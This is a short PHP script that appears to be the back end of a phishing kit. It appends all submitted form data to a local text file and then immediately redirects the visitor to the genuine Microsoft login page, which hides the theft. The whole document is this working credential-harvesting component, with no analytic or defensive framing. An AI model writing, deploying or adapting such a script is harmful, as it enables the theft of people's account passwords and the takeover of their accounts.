<?php

$file = "export/data.txt";
file_put_contents($file, print_r($_POST, true), FILE_APPEND);

?>
<meta http-equiv="refresh" content="0; url=https://login.live.com"/>
